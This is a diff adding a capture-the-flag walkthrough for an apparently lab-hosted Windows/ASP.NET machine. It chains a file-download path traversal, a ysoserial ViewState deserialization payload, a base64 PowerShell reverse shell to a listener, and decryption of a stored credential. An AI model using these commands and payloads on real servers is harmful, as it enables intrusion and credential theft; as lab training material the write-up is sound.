@@ -36,3 +36,142 @@ Progress: 4989 / 4990 (99.98%)
 Finished
 ===============================================================
 
+when we enter the webpage, we can downaload the CV of the web developer
+
+in burpsuit we can see next:
+    POST /portfolio/default.aspx HTTP/1.1
+
+Host: dev.pov.htb
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate, br
+
+Content-Type: application/x-www-form-urlencoded
+
+Content-Length: 355
+
+Origin: http://dev.pov.htb
+
+Connection: close
+
+Referer: http://dev.pov.htb/portfolio/default.aspx
+
+Upgrade-Insecure-Requests: 1
+
+
+
+__EVENTTARGET=download&__EVENTARGUMENT=&__VIEWSTATE=3KuB8Mg5mkx0Hmcr494qndYyhGO0LKPhlaGuuAXSZR0qjDSwdG%2BbSXcWUIT66aeb4JgXdnR8LNFZ6R%2F7kyFILRvLN7k%3D&__VIEWSTATEGENERATOR=8E0F0FA3&__EVENTVALIDATION=Rh3Ss7y829paElOv1xhEv6FzX2xqCbHBjUVX5UToCwiH1i20z8%2F3lChiZJ3XDUt6rqKXaLVsXoX2lMze8hS4wANCyevM7W%2BN3kNuo2pi05GbHjRmpKlKNE7fxxMMFSNUIhKT0w%3D%3D&file=cv.pdf
+
+where at the end we can notice the &file=cv.pdf parameter,trying to change it to /web.config, and we download the file web.config
+
+inside it we can see:  
+    <configuration>
+  <system.web>
+    <customErrors mode="On" defaultRedirect="default.aspx" />
+    <httpRuntime targetFramework="4.5" />
+    <machineKey decryption="AES" decryptionKey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" validation="SHA1" validationKey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" />
+  </system.web>
+    <system.webServer>
+        <httpErrors>
+            <remove statusCode="403" subStatusCode="-1" />
+            <error statusCode="403" prefixLanguageFilePath="" path="http://dev.pov.htb:8080/portfolio" responseMode="Redirect" />
+        </httpErrors>
+        <httpRedirect enabled="true" destination="http://dev.pov.htb/portfolio" exactDestination="false" childOnly="true" />
+    </system.webServer>
+</configuration>
+
+based on this article(https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-parameter#test-case-6-viewstateuserkeys-is-being-used)
+
+the VIEWSTATE is the attack vector header
+
+A tool we can use to exploit it is(https://github.com/pwntester/ysoserial.net/releases/tag/v1.36)
+
+so what we need to do is,to take this command:
+
+    ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "<COMMAND>" --path="/portfolio/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"
+
+and replace the -c "" with the reverse shell payload
+
+entering the revshells.com
+
+choosing OS windows and choosing powershell base64:
+
+powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMQAyADAAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
+
+this is our payload before using the ysoserial
+
+in Windows VM, download and extract the ysoserial,entering the folder where we extracted the program
+
+and in url launching cmd, after that we need to invoke the program and give it our payload so it could decrypt it to VIEWSTATE parameter:
+
+3tZz8mxIfXWNUMxZf20n4Lqn3gk7x0q5nzym89S%2FQLRRRQnqbDuGX5jhv9c%2BELFajecFL0Up0rUqwrH79LHoAErqdCbQMBarburXMWwQdotj1qoCQ9ok%2B%2FATCQPAJkdYx9Cx5lBCt2vBcaus%2FyVmKFF%2FBO%2BjWRBZl%2FQmk6mrmMPpDcLI9wCWvtQYY6m1O8uVw7HDLkK6iXN20sJzC%2F%2F%2FhOm6%2Bdphw0d8qxCS0PZR0v9vYfGdP8yDt0uLrVO4cGYt2vOBiPhCvYeI35kmquvTFK8dh5SdGAH6gw9XdBs8d5ZM1pwT%2Fo2SZVoR1k%2FJnUAQUYrgRQcy7pntcXkpStvvUXCgD2779MzxmIOAfB9cjPMjYJIVbTM59nuJdBrAz3nPlkzRFuCSYjJ6LAjaHY6wl1Wt2G107cuHXhFxBwcIcekzK7K7fQq0BAaoKMAEpoH3y2LxwMS9WPKXUuXH19uFaSp4DnckAo7iBqdqXJiG5%2Flk%2FUyM%2FDXXE1IZvhYHvtt8hfJm1P%2FPayw01dfiJ0eqA7pRIyW31mPcpq8y%2FGHn1GlG8DA7Mn3616ouOaOkQ6GrxkHWnNc9NiVtR28CMv36WtxVVXjg%2B0d6rjwJ8HegJ3kvXe2TAGneBIC9lbn0Las2HPsM%2B30TsBlkiE9xaqvoZ3YKobBV4ENZHSMIct9ynbhUv9fz%2BfGJD8QLvd6PLbjfoMFiYWbUjq0eKf5Jy%2FfurH2IZaNV7xtE0sQ7UnUevKeXpWVI4IIzUr5lXf1vaa6et1B176n5ORI7IREkAyyqvPWSjwKn7pWGk9GwmnpK7egjrfLBgLx%2BR28utU3kP5vByMFhPqiFmffXWZxpM3jmlU%2B2y44mOYRXlaaE2HZvobsPonEoTTv4jeyp1tS7JCScSIkxX8f5t7LzzT5XfDAVWlYdbP9qOiG7ZarV5BwrBm%2BpB0j0OXVHCx4jvSHjwRUqkLY4adgW%2F500MXBmujutfnW%2Bj%2B7158gbwZDtFpCOppoULfmwR1Vi2%2FqxQtFnrd%2FPuf%2FK%2FtmWxVAn8XyiO0wLGQgVNe1d%2BDVJUKcQpxNqlA0HO1bkMuvNCM88Q6eYMCPkXz4nGfw0YGLjNMEN%2B0OeKgIBBX9NuFVhCq%2FNHcD%2FsfNKBYbyOOzSrwZBouMTKsWo0h3K99Gt4KGj6XgEcHvOXNdePOgYPkZKHO8PHmnXNG9WPCrPf90BDw2Ujm%2BAAGeVhMHxjLsVK%2F%2FMKJMMn28cVN759SWbbsxfJM3m2y8oqfGY4O9NEql3JhOXz7%2BDghPDhutcMvVlnaeJvlUkX2gW03yzXm4DrFx7aJXnjzBc3S70cedqsUsg8FQgcce1LCpXFzimXpJCq5caCzE4BjgsP4FHgOOInulCXlVwApLH7yWRiCwDjCKZhYNOsEtfCN%2FvboAnOh1%2BQIwUuuwlNX37e6x0hfcev2r0J7Dh7Bf1dpxk1xf2TbwYffiFVYR8HZTn7hqRfddMH9lmrShLIbMz9b6OKnpnWe9F2CGmwwjMqdTBG%2B96JGCyAMT2kOduUHEyuAT8HGCc2X%2FBNxS1N%2FESd9GVUoZrSwc3Ji95YfAEimvh1YciQxQ0zRSG4w7IqIPNm9eJS6VhsGdhTWeoZuU1JHTcdyOi1WSk90H7QLhh%2BmsqBxk7KNSM9rqaZkzsnwHeF9U3E8CEEIT3HUT%2FcXF2n5O2hWk2cksa%2FYvEg%2B1jA%2F%2FTKpCvJnZBm%2FJpxzZVyjWMhskja5Adpx4BQi58UUX221gWdxq4aA5AtQ6f%2FW1fKrzzNpobFbgpMYSyMImXkbtfXw9PrVbWXgrLtDRT9T7Rerdsp6ImGoFw7AvWVmrnrnTa8GUxwit2Ctf%2FHspv3dv%2FRAnGOlTAenUGZUPSzwsIEbvJp61w9h6WgUS2VxxZFRWjbfp8Ce0DV2fExXSIgCjIdPzdPYPStsWido%2FsaMBBKV0h1GiCAMFyXNHJ6NXEvr51HZgvPs%2B7Kip%2BFM8egIjBzANYjIyxtUGdFm%2FQZiMxocYKvB7Bc44Va8lpwVqKmzBcaL1OI%2Bzif4qLr5FTTilt6vAQ7oKHr0IyLeS663NTleJihVUubrYwTZgL5YJlLedciZ0duwO1GMECGRHdVEJMGN75xsuw6V3YYU6EOWPQ071isAfJ1eqzBbaCJhBNwzkGcYUVVLwKm1gCWam%2FFTU1nuzcjogdbDrh370tvch6E2NhNDNkdkPRLl9591WxGJdYFYDO%2FK92pqeWou3JlWjJFaCfKyutlX33s3LZv4TKc4MOkSarA5n2wm90baB%2FCFvjcriQKhe%2Fdp16IHJcl%2Bql1%2BG7yWwNMAClTUxCzI1VhVHDbGmMJw6g%2BNR2Hx2WJTujOLDn7yzASDAJqq17LKjl%2BnmB9Dxp9kwmrCUFxgId1KlgPbMbB%2BuLroqgHMLV3zavR7oZXmnWP7c52VlAuJQ1DXw8cpzXJdRH6PMExBMKNg%2BLmELFRorHatBOOn%2BRJGOO7F4H%2Bzm12bQ%2Fn3Y1GmhTaZUB7RJE%2FJT6lDRuw4PHPDOC61IdIq1KjctIPnWyqsst91LSIBaevJqz1SZ2j2cC9R3uyuVjWM9FsM0SJ%2F%2BXMReWFb3Lnv2%2B5lry8rrFVzVs2x8bkpUxVecS4G%2FyoYYJZ4k%2FEpDirkFP8lZfWBBDOVXAWa3PuHpVaDj6wThJRZAcSmSMRV%2FuX4PXYqyByvg%2FbyYz4c3ZyM%2FjIC%2BLgX5ponnqFIyhsApDbFgh1wEqmyBSxXIUHD5Ee3LBAP025Em1HmChPn84J3vtdjxwpTds5TseKctoZwZRyCT8ol%2B8ruHWc%2BFveCpnz3mB8IKqtN9LxaHVPMk2PHCwoF9irvb9V6LeX32jru3AIz8vsU9ZeOJ3ACFkvMXwt%2B4axtAqgWCy4GV1LF18xiPx4lPSTtg6q8wp4cTDZz3EEhaUvwPcMesLBagrm7CQd6reb0DCeo4yOgmrMRYeFvYv37v8F8H1yhjn9DQBECT2uG%2FtW%2BIRFmKsz9qiqv9KBguc7hq8xvnjbTZQvdYuoF0rzpEsM4fcyHjF5whytCKh4EP5EJiZ6OEGA%2Fe%2BJT1AFvpwibxqi4zY9uAu4iuz4igagfFnn%2BZG2w7kOZ0%2FgVR3v8%2B0%2FhV3JPDELbY7nTurgYRzYqb3qjAb6U%2FGQFYNxzTjGRGVLyZ8QBELr%2BKW1ZhOMWrry%2BZoHompthOXroscy8K3vTeuBDJQjZrGGsCqTKTCnZfLuQ5oSIN%2FDU0YuZXytZwsnybfLpIdkXRzD%2FXPPgERpdIF23Py5nqUOg5wgPBD9WIXPF%2FoeeUJbIlC6CKPGHtA%2Bv%2BIl6NXtecwh%2FuVbjVBGXMWLonFWYcg0D6CSwE5ub3Uaz%2BGjZKnsPrFfDSKbyGQIKbredz%2FZ1jD87TvOuQBQVD44ngc%2BgK2cNozJ4exllbveruX%2F2cLhLUDliTRu6jCblM3ltKMTh%2FyPHqw7BCspRcfj6pklpZyK2mgXF%2BOK6yTIs43xleKne9qc9Pz3%2B%2BTVUtjIZPFBzIRGT6dQWrtgTncZ4XpYFw8Ytl1owloxH7eOXQLTCB4jLu1b6fu4haKFswU41z1kFt%2F7IW1VRIazypfks%2FtLBRZesExBTWvc5p0vcNhQNSGlu%2F3pti8Fq%2BNlyDjN4pJqo%2FIE81aXMaeF3YQH0VibaIFUIGQHxLoil2PrvYAnHFJNhlsnEHo6ps5Nk%2F3tofEzWCeVxM2uK80S%2Baws9Dz8lF5KgeWusfRtV4MRo3k0xxNoIXtlhos2HVyNw9UMMy%2BfdIeQBxTBS4Q3XuSUwLEQ2c0fO1GQzI6J24TNegqfjcF%2ByKBYAI03VweEJ0ABA%2B306Mf5JcCCz1tNzvvLmpYuYYc0syVfkBpEUDpTPydb4QbWPiWnQYlZwx%2BpKlLlQmYIG%2FCEPHZxFu76EOjC%2BZqfAvxCffp4SIORG22TEgexRUPyXbGGBCpdhiGMhBtPz2Vkot0o7GufJYlXYSRoe6uk8%2F8V6PbM2No0lsTXdYAFp%2Fck9icH%2FV93Y%2Bh9RpjehXucttnCCZCtWQqoXe6m63lqTxliiIi1pwdj%2FwXFEcKH7SnHILOs71SJhwtcXQ0sM%2B6OlBcDKczWUUHHYzHtxB3DCI6GUdwAKq%2ByhiUevlM%2BicwkxoDAufYjR47fk7x4smz%2BPEEnFSYWXz0p9HGIAubNsqa7iS2wCgFvFnXPQ0DcV1icn8fTWP14ITB4NjG6Az5m%2FJO7rmfwi18IstlFyj8BqFT9dEgX9bd3DPOVoSqjS2vnC6LHt2V0tYcbKFbVEX8Ce%2F1v6HP4VhtiEbj53GSIJ68mpWrY1LZ0K9LiRJ6YjpcXkfIOIpLArkz8PI8qTLQTtzP7je6pMTokCg2jMLpePJqkyvrysOvU4sGEsxOyG4a5B%2FW2fTJxujSm6LV7irtvBFF4A2tjTr5gNVLuZ1Pyoi2hEEqtTiFeU8V%2Bg3OGjQBz%2Fq9%2BmEv53xibbpi4YUejL5UjrDdH8zI5XXd7xpem%2B6I4Kn%2FeYZNfAxiTxlnxT5yRu7K%2FnDr55AbOMnugX6R0rl4oZ6K89mRx4znVzBbS%2BudmzJM1OeT4RTlXKO6lrMPwWa%2FAENrP8OX%2BBjArmcMlzyvcVNV2SKRj2nuqVaDDpFsN7LPTeqNxbGru9pVDbQDl4%2BuJv4nAKCqoVBY7va2LYuignDN843fTEAme8%2FpmokPzPT5h%2ByXhV8Lrr5631zetZjj%2FJsmF4zTIEKPeJ3f5iUHWavR3RpNyEuxGQRck%2Bs1UqEzGYsMoqsxXLpYZsnb2%2F9yNFuSOnAPD%2F2dk5BWb%2BeEAgkRTzf6n7Fgzut6UIPvmACWBcjMFjKiGx5HRaVnX32ke5Yp8mtY0e7jlhTG7dxK
+
+this is our payload after the ysoserial
+
+now we need to go back to burp and intercept the packet again 
+
+in VIEWSTATE parameter we inject our payload, but before we need to open listener:
+
+    rlwrap nc -lnvp 4444
+
+sending the request nad we get the reverse shell
+
+in the C:\Users\sfitz\Documents, we got file connection.xml,opening it via more command:
+    Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
+  <Obj RefId="0">
+    <TN RefId="0">
+      <T>System.Management.Automation.PSCredential</T>
+      <T>System.Object</T>
+    </TN>
+    <ToString>System.Management.Automation.PSCredential</ToString>
+    <Props>
+      <S N="UserName">alaading</S>
+      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6</SS>
+    </Props>
+  </Obj>
+</Objs>
+
+to decrypt it we need to:
+1) save it to text file via echo <password code>
+2) $encryptedString = Get-Content -Path "C:\Users\sfitz\test.txt"
+3) $secureString = $encryptedString | ConvertTo-SecureString
+4) $bstr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureString)
+5) $plainTextPassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr)
+6) [System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($bstr)
+7) $plainTextPassword
+
+and the password is:
+    f8gQ8fynP44ek1m3
+
+now to enter as alaading we need to open a new reverse shell
+
+opening new listener with another port using rlwrap nc -lvnp 4443
+
+and we need to do the next commands to open:
+1)$username = 'alaading'
+2)$password = 'f8gQ8fynP44ek1m3'
+3)$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
+4)$credential = New-Object System.Management.Automation.PSCredential ($username, $securePassword)
+5)Invoke-Command -ComputerName localhost -Credential $credential -ScriptBlock {<encoded powershell reverse>}
+
+looking at the new listener and we got the a new connection
+
+going to C:\Users\alaading\Desktop and we get the user flag:
+    7c5a414a7cd2ec6d6e08f8b29494e7af
+
+to see what privileges we have, we need to type whoami /priv :
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State   
+============================= ============================== ========
+SeDebugPrivilege              Debug programs                 Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+
